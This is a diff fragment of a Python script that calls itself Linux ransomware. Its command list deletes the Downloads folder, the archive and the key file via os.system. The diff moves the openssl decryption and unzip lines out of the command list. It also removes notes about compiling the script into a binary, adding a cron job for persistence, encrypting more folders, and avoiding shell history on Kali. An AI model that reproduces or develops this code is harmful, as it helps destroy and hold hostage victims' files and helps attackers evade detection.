@@ -7,21 +7,12 @@ commands= [ \
 "rm -r Downloads", \
 "rm -r Downloads.zip", \
 "rm key.bin"
-#decryption
-"openssl enc -d -aes-256-cbc -in Downloads.enc -out Downloads.zip -pass file:./key.bin"
-"unzip Downloads.zip"
 ]
 
 for i in range(0,len(commands)):
         os.system(commands[i])
 
+#decryption
+"openssl enc -d -aes-256-cbc -in Downloads.enc -out Downloads.zip -pass file:./key.bin"
+"unzip Downloads.zip"
 
-#linux ransomware written in python3
-
-
-### notes
-#use autopytoexe to compile this python file into a binary
-
-#make a cronjob ;)
-#maybe encrypt more folders
-#when executed in kali linux, history does not save the commands, test for other distros and os's
